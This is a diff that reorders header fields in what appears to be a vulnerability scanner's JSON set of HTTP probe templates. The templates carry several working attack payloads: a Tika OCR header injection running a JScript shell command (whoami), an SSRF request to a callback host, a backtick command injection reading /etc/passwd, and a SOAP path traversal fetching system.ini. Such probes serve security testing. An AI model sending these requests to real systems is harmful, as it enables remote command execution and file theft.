@@ -5930,11 +5930,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -8588,8 +8588,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -9767,8 +9767,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10121,9 +10121,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
